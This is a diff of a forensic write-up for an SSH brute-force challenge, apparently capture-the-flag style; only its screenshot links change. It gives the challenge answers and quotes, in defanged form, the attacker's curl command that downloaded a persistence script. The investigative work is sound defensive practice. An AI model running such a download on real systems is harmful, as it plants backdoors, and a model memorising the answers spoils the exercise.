@@ -24,7 +24,7 @@ Successfully gained access on Root and Cyberjunkie
 cat auth.log | grep -i 'Accepted'
 ```
 
-<img width="852" height="134" alt="Screenshot 2026-02-20 142132" src="https://github.com/user-attachments/assets/bf6aa6aa-9331-4f17-b205-298796b0d276" />
+<img width="852" height="134" alt="Screenshot 2026-02-20 142132" src="https://github.com/user-attachments/assets/b4a69251-a415-489d-8ece-dd1475ba3f6a" />
 
 Answer: 65.2.161.68
 
@@ -34,7 +34,7 @@ Answer: 65.2.161.68
 
 The attacker gained the root access on the server by Brute forcing the SSH 
 
-<img width="912" height="119" alt="Screenshot 2026-02-20 143849" src="https://github.com/user-attachments/assets/fa1d5036-e04b-4140-9d82-e1dfde8519e7" />
+<img width="912" height="119" alt="Screenshot 2026-02-20 143849" src="https://github.com/user-attachments/assets/8736ed3c-b908-4077-a16b-de0277a024ff" />
 
 Answer: root
 
@@ -50,11 +50,11 @@ I have used command utmpdump:
 
 We know that the attacker IP is 65.2.161.68
 
-<img width="894" height="436" alt="Screenshot 2026-02-20 145209" src="https://github.com/user-attachments/assets/1c99048c-b55b-4e38-ad9f-e4c9b4bad81b" />
+<img width="894" height="436" alt="Screenshot 2026-02-20 145209" src="https://github.com/user-attachments/assets/e05230d2-1d6e-40f1-ae36-b9528dd46c96" />
 
 I have confirmed it with the Timestamp in 06:32:44
 
-<img width="764" height="105" alt="Screenshot 2026-02-20 145353" src="https://github.com/user-attachments/assets/f103c26e-f9ea-434e-ac24-8c961a24820a" />
+<img width="764" height="105" alt="Screenshot 2026-02-20 145353" src="https://github.com/user-attachments/assets/f6a8a40e-d6e5-4e81-bc71-225e38d878f4" />
 
 Answer: 2024-03-06 06:32:45
 
@@ -64,11 +64,11 @@ Answer: 2024-03-06 06:32:45
 
 I have used grep command to filter by session, And the attacker gained access of root also i used another grep command to filter it out.
 
-<img width="901" height="306" alt="Screenshot 2026-02-20 152013" src="https://github.com/user-attachments/assets/acc1efb2-7d6b-43c0-bddf-47902b0fa007" />
+<img width="901" height="306" alt="Screenshot 2026-02-20 152013" src="https://github.com/user-attachments/assets/5fae330c-7448-4ff0-83a8-3270bfcd089e" />
 
 I have confirmed by checking with the timestamp, the attacker gained the access on 06:32:44 by looking at this 
 
-<img width="764" height="105" alt="Screenshot 2026-02-20 145353" src="https://github.com/user-attachments/assets/d4de38c6-8ed4-4089-b113-03ff9ddbb189" />
+<img width="764" height="105" alt="Screenshot 2026-02-20 145353" src="https://github.com/user-attachments/assets/26aa01e7-120b-44cf-9d4d-ab0ab8d94f17" />
 
 Answer: 37
 
@@ -77,11 +77,11 @@ Answer: 37
 5.The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?
 
 Previously we have found a user cyberjunkie where the passwords where accepted 
-<img width="767" height="102" alt="Screenshot 2026-02-20 152616" src="https://github.com/user-attachments/assets/eefb3fc1-c628-4c9c-be37-3b88be763dfe" />
+<img width="767" height="102" alt="Screenshot 2026-02-20 152616" src="https://github.com/user-attachments/assets/be69aa47-24de-4541-92b4-7d64b8b720c2" />
 
 I have used this grep to find the log details about the cyberjunkie
 
-<img width="960" height="283" alt="Screenshot 2026-02-20 152809" src="https://github.com/user-attachments/assets/b71a414e-bdc8-4bde-8df8-39862a518b39" />
+<img width="960" height="283" alt="Screenshot 2026-02-20 152809" src="https://github.com/user-attachments/assets/1bc821fa-7235-4e92-822d-c475e8ebbe87" />
 
 On 06:34:18 the attacker created and added to group
 
@@ -93,7 +93,7 @@ Answer: cyberjunkie
 
 In the MITRE ATT&CK official site we can check out the technique and sub-techniques about the attacker next move. We know that attacker is moving persistence technique.
 
-<img width="960" height="480" alt="Screenshot 2026-02-20 155256" src="https://github.com/user-attachments/assets/47e994aa-8ab9-4ab5-94c8-a99953fdb105" />
+<img width="960" height="480" alt="Screenshot 2026-02-20 155256" src="https://github.com/user-attachments/assets/c65bf9d2-2046-4b1c-8130-39f875ba84b0" />
 
 Answer: T1136.001
 
@@ -105,7 +105,7 @@ In the question they have asked yyyy-mm-dd but the auth.log contains only month,
 
 I have used utmpdump wtmp to view the full timestamp
 
-<img width="960" height="425" alt="Screenshot 2026-02-20 160314" src="https://github.com/user-attachments/assets/8595a320-2ed4-41c7-8dc0-26509bddfdc7" />
+<img width="960" height="425" alt="Screenshot 2026-02-20 160314" src="https://github.com/user-attachments/assets/561d9cf9-e442-48a4-b320-e2c5ec95dac1" />
 
 This was the timestamp recorded that SSH session ended 
 
@@ -123,13 +123,13 @@ The attacker just installed the backdoor script using the curl command.
 cat auth.log | grep -i 'cyberjunkie'
 ```
 
-<img width="960" height="309" alt="Screenshot 2026-02-20 161015" src="https://github.com/user-attachments/assets/4768876a-034f-421c-9db0-1c0efddbe80b" />
+<img width="960" height="309" alt="Screenshot 2026-02-20 161015" src="https://github.com/user-attachments/assets/05db65c7-2f3b-489a-9613-7f3e360954c3" />
 
 Answer: /usr/bin/curl hxxps[://]raw[.]githubusercontent[.]com/montysecurity/linper/main/linper[.]sh
 
 ---
 
-<img width="591" height="212" alt="Screenshot 2026-02-20 161428" src="https://github.com/user-attachments/assets/5d66da2d-d228-4504-9923-5970b2e9e3c4" />
+<img width="591" height="212" alt="Screenshot 2026-02-20 161428" src="https://github.com/user-attachments/assets/de6a474a-d846-49e3-b9c8-673ec495354b" />
 
 ---
 
